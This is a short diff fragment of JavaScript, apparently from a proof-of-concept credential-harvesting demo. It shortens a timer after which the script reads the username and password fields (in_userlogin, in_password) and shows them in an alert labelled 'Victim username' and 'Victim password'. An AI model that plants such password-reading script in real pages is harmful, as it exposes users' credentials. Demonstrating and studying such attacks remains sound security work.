@@ -10,7 +10,7 @@ let isFilled = false;
         setTimeout(function() {
           alert('Victim username: '+document.getElementsByName('in_userlogin')[0].value+'\n\nVictim password: '+document.getElementsByName('in_password')[0].value);
          
-        }, 4500); 
+        }, 3000); 
       }
     }
   }
